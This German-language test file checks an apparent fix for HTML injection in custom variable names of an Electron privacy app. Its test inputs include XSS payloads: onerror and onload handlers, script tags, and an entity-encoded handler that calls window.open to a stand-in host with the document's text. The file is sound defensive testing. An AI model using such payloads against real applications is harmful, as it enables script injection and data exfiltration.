// S3.fix (rot bis zur Umsetzung): Eigene Variablen duerfen nie als HTML in die Oberflaeche gelangen (S3 der GPT-Pruefung 1).
// Ursache: addCV() uebernimmt den Namen nur mit trim/Grossschreibung/Unterstrich, renderCV() setzt ihn unmaskiert in innerHTML.
// Erwartung nach der Umsetzung (Ablehnen ODER Neutralisieren, beides erfuellt die Tests):
//  - kein Element, kein Ereignishandler, kein Ausloeser fuer window.open aus dem Namen
//  - jeder gespeicherte Name genuegt der strengen Regel der Bestandsfunktionen (policy.CATEGORY_RE, marks PFX_RE): ^[A-Z][A-Z0-9_]{1,19}$
//  - renderCV baut die Zeilen ohne innerHTML (textContent/createElement)
// Nur harmlose Ereignismarker (window.PSS3*), externes Oeffnen wird vom Testmodus (PS_BLOCK_EXTERNAL=1) nur protokolliert. Synthetische Werte.
import test from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import path from 'node:path';
import { createRequire } from 'node:module';
import { launchApp, toolFrame, ROOT } from './helpers.mjs';

const require = createRequire(import.meta.url);
const placeholder = require('../app/lib/placeholder.js');
const STRIKT = /^[A-Z][A-Z0-9_]{1,19}$/;
// alle Zeichen als HTML-Entitaet: Gross-/Kleinschreibung und Leerraum spielen keine Rolle
const ent = (s) => [...s].map((c) => '&#x' + c.charCodeAt(0).toString(16) + ';').join('');

async function mitApp(fn) {
  const a = await launchApp({ offline: true });
  try {
    const f = await toolFrame(a.win);
    await f.evaluate(() => { try { localStorage.setItem('privacyShield_onboarding_done', 'true'); } catch (e) {} });
    return await fn(a, f);
  } finally { await a.close(); }
}
async function addVar(f, name, pat = 'ZZQ\\d{3}') {
  await f.evaluate(({ name, pat }) => {
    document.getElementById('VN').value = name;
    document.getElementById('VP').value = pat;
    addCV();
  }, { name, pat });
  await f.waitForTimeout(500);
}
// Ablehnung: Liste eigener Variablen bleibt leer, ein Fehler-Toast mit dem Regeltext erscheint, die Anzeige hat keine Zeile
async function ablehnen(f, name, pat) {
  await f.evaluate(() => { const t = document.getElementById('TOAST'); t.className = 'toast'; document.getElementById('TT').textContent = ''; });
  await addVar(f, name, pat);
  const r = await f.evaluate(() => ({
    cvars: cvars.map((v) => v.n),
    zeilen: document.querySelectorAll('#CVL .custom-var-row').length,
    toastKlasse: document.getElementById('TOAST').className,
    toastText: document.getElementById('TT').textContent,
  }));
  const label = JSON.stringify(name);
  assert.deepEqual(r.cvars, [], 'Name ' + label + ' wurde gespeichert');
  assert.equal(r.zeilen, 0, 'Name ' + label + ' erzeugt eine Zeile');
  assert.match(r.toastKlasse, /\bon\b/, 'kein sichtbarer Toast fuer ' + label);
  assert.match(r.toastKlasse, /\be\b/, 'Toast fuer ' + label + ' ist kein Fehler-Toast');
  assert.match(r.toastText, /2 bis 20 Zeichen/, 'Toast ohne Regeltext fuer ' + label + ': ' + r.toastText);
}
const namen = (f) => f.evaluate(() => cvars.map((v) => v.n));
// Alles, was in #CVL ausser den drei erwarteten Elementarten steht (div-Zeile, span, button)
const fremdeElemente = (f) => f.evaluate(() => [...document.querySelectorAll('#CVL *')]
  .filter((e) => !['DIV', 'SPAN', 'BUTTON'].includes(e.tagName)).map((e) => e.tagName));

test('Markup-Name <b>test</b>: kein <b>-Element in der Variablenliste, nur woertlicher Text oder abgelehnt', () => mitApp(async (a, f) => {
  await addVar(f, '<b>test</b>');
  assert.deepEqual(await fremdeElemente(f), [], 'in #CVL darf kein eingeschleustes Element stehen');
  assert.equal(await f.evaluate(() => document.querySelectorAll('#CVL b').length), 0);
}));

test('Markup-Name <b>test</b> wird abgelehnt (leere Liste, Fehler-Toast)', () => mitApp(async (a, f) => {
  await ablehnen(f, '<b>test</b>');
}));

test('Ereignishandler im Namen (<img onerror=...>) wird nicht ausgefuehrt und erzeugt kein img-Element', () => mitApp(async (a, f) => {
  await addVar(f, '<IMG/SRC="X"/ONERROR=PSS3MARK=1>');
  await f.waitForTimeout(500);
  const r = await f.evaluate(() => ({ mark: window.PSS3MARK === 1, imgs: document.querySelectorAll('#CVL img').length }));
  assert.equal(r.mark, false, 'Ereignismarker wurde gesetzt: Skript aus dem Namen lief');
  assert.equal(r.imgs, 0);
}));

test('Ereignishandler mit Entitaeten (Gross-/Kleinschreibung egal) erreicht weder parent.electronAPI noch window.open', () => mitApp(async (a, f) => {
  await f.evaluate(() => { document.getElementById('IT').value = 'SYNTHETISCH-TESTWERT-123'; });
  const js1 = "window.open('https://example.invalid/ps-s3?d='+encodeURIComponent(document.getElementById('IT').value))";
  const js2 = "window.PSS3API=typeof parent.electronAPI+':'+typeof parent.electronAPI.copyText";
  await addVar(f, '<IMG/SRC="X"/ONERROR=' + ent(js1) + '>');
  await addVar(f, '<IMG/SRC="X"/ONERROR=' + ent(js2) + '>');
  await f.waitForTimeout(800);
  const ext = await a.app.evaluate(() => globalThis.__psExternal);
  assert.deepEqual(ext, [], 'es darf kein externer Aufruf mit Dokumentdaten entstehen');
  assert.equal(await f.evaluate(() => window.PSS3API || null), null, 'Skript aus dem Namen sieht electronAPI');
}));

test('Markup-Name bringt kein neues Element ausserhalb der Variablenliste in die Seite (script, iframe, svg, style, a, form)', () => mitApp(async (a, f) => {
  const zaehle = () => f.evaluate(() => document.querySelectorAll('script, iframe, svg, style, a, form, img, object, embed').length);
  const vorher = await zaehle();
  await addVar(f, '<svg onload=PSS3SVG=1></svg><script>PSS3SCR=1</script><a href=x>l</a>');
  const r = await f.evaluate(() => ({ svg: window.PSS3SVG === 1, scr: window.PSS3SCR === 1 }));
  assert.deepEqual(r, { svg: false, scr: false });
  assert.equal(await zaehle(), vorher, 'die Zahl der Elemente darf durch einen Namen nicht wachsen');
}));

// Jedes Markup-Zeichen einzeln: abgelehnt, nie gespeichert
for (const [zeichen, bezeichnung] of [['<', 'spitze Klammer auf'], ['>', 'spitze Klammer zu'], ['&', 'Und-Zeichen'], ['"', 'doppeltes Anfuehrungszeichen'], ["'", 'einfaches Anfuehrungszeichen']]) {
  test(`Name mit ${bezeichnung} (${zeichen}) wird abgelehnt (leere Liste, Fehler-Toast)`, () => mitApp(async (a, f) => {
    await ablehnen(f, 'KUNDE' + zeichen + 'NR');
    assert.ok(!(await f.evaluate(() => document.getElementById('CVL').innerHTML)).includes('KUNDE' + zeichen + 'NR'), 'Rohname steht im HTML der Liste');
  }));
}

for (const [name, bezeichnung] of [['1ABC', 'fuehrende Ziffer'], ['X', 'ein Zeichen'], ['A'.repeat(21), '21 Zeichen'], ['_ABC', 'fuehrender Unterstrich'], ['KUNDE-NR', 'Bindestrich'], ['K\u00dcNDE', 'Umlaut']]) {
  test(`Name mit ${bezeichnung} (${name}) wird abgelehnt (leere Liste, Fehler-Toast)`, () => mitApp(async (a, f) => {
    await ablehnen(f, name);
  }));
}

test('Gutfaelle an der Grenze: VTR_2, zwei Zeichen und genau 20 Zeichen werden angelegt', () => mitApp(async (a, f) => {
  const zwanzig = 'A' + 'B'.repeat(19);
  assert.equal(zwanzig.length, 20);
  await addVar(f, 'VTR_2', 'ZZQ\\d{3}');
  await addVar(f, 'ab', 'YYQ\\d{3}');
  await addVar(f, zwanzig, 'XXQ\\d{3}');
  assert.deepEqual(await namen(f), ['VTR_2', 'AB', zwanzig]);
  for (const n of await namen(f)) assert.match(n, STRIKT);
  assert.equal(await f.evaluate(() => document.querySelectorAll('#CVL .custom-var-row').length), 3);
}));

test('Loeschen: bei zwei Variablen entfernt der Loeschknopf der richtigen Zeile nur diese', () => mitApp(async (a, f) => {
  await addVar(f, 'ALPHA', 'AAQ\\d{3}');
  await addVar(f, 'BETA', 'BBQ\\d{3}');
  assert.deepEqual(await namen(f), ['ALPHA', 'BETA']);
  await f.evaluate(() => {
    const zeile = [...document.querySelectorAll('#CVL .custom-var-row')].find((z) => z.querySelector('.custom-var-name').textContent === '{{ALPHA}}');
    zeile.querySelector('.custom-var-del').click();
  });
  await f.waitForTimeout(300);
  assert.deepEqual(await namen(f), ['BETA']);
  assert.deepEqual(await f.evaluate(() => [...document.querySelectorAll('#CVL .custom-var-name')].map((e) => e.textContent)), ['{{BETA}}']);
  // zweite Variable (nicht die erste) loeschen: wieder nur die gewaehlte verschwindet
  await addVar(f, 'GAMMA', 'GGQ\\d{3}');
  await f.evaluate(() => {
    const zeile = [...document.querySelectorAll('#CVL .custom-var-row')].find((z) => z.querySelector('.custom-var-name').textContent === '{{GAMMA}}');
    zeile.querySelector('.custom-var-del').click();
  });
  await f.waitForTimeout(300);
  assert.deepEqual(await namen(f), ['BETA']);
}));

test('Rundlauf: Platzhalter aus einem Markup-Namen ist immer ein gueltiger Platzhalter (Gegenpruefung und Rueckuebersetzung erkennen ihn)', () => mitApp(async (a, f) => {
  await addVar(f, '<B>TEST</B>');
  const out = await f.evaluate(async () => {
    document.getElementById('IT').value = 'Kontakt ZZQ123 Ende';
    aiCache = { key: null, spans: [] };
    await anon();
    return document.getElementById('AT').value;
  });
  assert.ok(!out.includes('<B>') && !out.includes('</B>'), 'Markup steht im Ergebnis: ' + out);
  for (const m of out.match(/\{\{[^}]*\}\}/g) || []) assert.ok(placeholder.isToken(m), 'kein gueltiger Platzhalter: ' + m);
}));

// Funktionsende per Klammerzaehlung; Zeichenketten und Kommentare werden uebersprungen
function funktionsKoerper(src, kopf) {
  const start = src.indexOf(kopf);
  if (start < 0) return null;
  let i = src.indexOf('{', start);
  const von = i;
  let tiefe = 0;
  for (; i < src.length; i++) {
    const c = src[i];
    if (c === '"' || c === "'" || c === '`') {
      for (i++; i < src.length && src[i] !== c; i++) if (src[i] === '\\') i++;
    } else if (c === '/' && src[i + 1] === '/') {
      i = src.indexOf('\n', i); if (i < 0) return null;
    } else if (c === '/' && src[i + 1] === '*') {
      i = src.indexOf('*/', i); if (i < 0) return null; i++;
    } else if (c === '{') tiefe++;
    else if (c === '}' && --tiefe === 0) return src.slice(von, i + 1);
  }
  return null;
}

test('renderCV setzt den Namen ohne innerHTML ein (textContent/createElement)', () => {
  const html = fs.readFileSync(path.join(ROOT, 'app', 'privacy-shield.html'), 'utf8');
  const body = funktionsKoerper(html, 'function renderCV()');
  assert.ok(body, 'renderCV nicht gefunden oder Klammern unausgeglichen');
  assert.ok(body.includes('custom-var-del') && body.trim().endsWith('}'), 'Funktionskoerper unvollstaendig erkannt:\n' + body);
  assert.ok(!/innerHTML|insertAdjacentHTML|outerHTML/.test(body), 'renderCV verwendet HTML-Zeichenketten:\n' + body);
});

test('Kontrolle (bleibt gruen): gueltiger Name mit Leerraum wird gross geschrieben, als Text gezeigt und im Ergebnis ersetzt', () => mitApp(async (a, f) => {
  await addVar(f, 'kunde nr');
  assert.deepEqual(await namen(f), ['KUNDE_NR']);
  assert.equal(await f.evaluate(() => document.querySelector('#CVL .custom-var-name').textContent), '{{KUNDE_NR}}');
  const out = await f.evaluate(async () => {
    document.getElementById('IT').value = 'Kontakt ZZQ123 Ende';
    aiCache = { key: null, spans: [] };
    await anon();
    return document.getElementById('AT').value;
  });
  assert.match(out, /\{\{KUNDE_NR_1\}\}/);
  assert.ok(!out.includes('ZZQ123'));
}));
